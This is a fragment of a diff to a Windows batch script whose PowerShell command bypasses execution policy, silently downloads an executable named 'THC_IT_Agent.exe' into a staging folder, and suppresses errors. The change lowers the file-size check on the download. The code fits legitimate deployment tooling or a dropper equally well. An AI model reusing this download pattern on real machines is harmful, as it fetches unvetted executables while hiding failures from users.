@@ -50,7 +50,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
     "    try { " ^
     "        $wc = New-Object Net.WebClient; " ^
     "        $wc.DownloadFile($u, '%STAGING_DIR%\THC_IT_Agent.exe'); " ^
-    "        if ((Get-Item '%STAGING_DIR%\THC_IT_Agent.exe').Length -gt 50000) { $downloaded = $true; break } " ^
+    "        if ((Get-Item '%STAGING_DIR%\THC_IT_Agent.exe').Length -gt 30000) { $downloaded = $true; break } " ^
     "    } catch {} " ^
     "} " ^
     "if (-not $downloaded) { exit 1 }" 2>nul
